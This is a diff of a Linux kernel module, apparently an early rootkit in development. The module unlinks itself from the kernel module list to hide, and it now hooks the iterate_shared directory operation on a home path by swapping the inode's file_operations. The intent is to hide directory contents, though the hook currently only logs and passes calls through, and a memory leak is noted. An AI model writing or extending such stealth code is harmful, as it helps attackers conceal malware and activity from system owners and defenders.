@@ -4,6 +4,7 @@
 #include <linux/namei.h>
 #include <linux/fs.h>
 #include <linux/kernel.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yanay Goor");
@@ -13,7 +14,8 @@ MODULE_VERSION("0.1.0");
 static struct list_head *modules;
 
 // TODO: Provide a way for the module to control the path(s).
-static const char *test_path_name = "/home/yanayg/test_file";
+static const char *test_path_name = "/home/yanayg";
+static int (*iterate_shared) (struct file *, struct dir_context *);
 
 static void hide_module(void) {
     // Save the list for later so we can add the module back in.
@@ -37,25 +39,43 @@ static void unhide_module(void) {
 	list_add(&THIS_MODULE->list, modules);
 }
 
-static int get_inode_by_path_name(const char *path_name) {
-    struct inode *inode;
+static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
     struct path path;
     int retval;
     if ((retval = kern_path(path_name, LOOKUP_FOLLOW, &path))) {
         return retval;
     }
-    inode = path.dentry->d_inode;
-    printk("Path name: %s, inode: %lu\n", path_name, inode->i_ino);
+    *inode = path.dentry->d_inode;
+    printk(KERN_INFO "Path name: %s, inode: %lu\n", path_name, (*inode)->i_ino);
     path_put(&path);
+    return 0;
+}
+
+static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
+    int res;
+	printk(KERN_INFO "Called hooked iterate!");
+	res = iterate_shared(filp, dir_context);
+	if (res) {
+	    return res;
+	}
     return 0;
 }
 
 static int __init MRK_initialize(void) {
 	int retval;
-	hide_module();
-	if ((retval = get_inode_by_path_name(test_path_name))) {
+	struct inode *inode;
+	// TODO: fix memory leak
+	struct file_operations *file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
+	if ((retval = get_inode_by_path_name(test_path_name, &inode))) {
 	    return retval;
 	}
+	printk(KERN_INFO "Inode fop iterate: %p\n", inode->i_fop->iterate_shared);
+	memcpy(file_operations, inode->i_fop, sizeof(struct file_operations));
+	inode->i_fop = file_operations;
+	iterate_shared = file_operations->iterate_shared;
+	file_operations->iterate_shared = new_iterate_shared;
+
+	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
 }
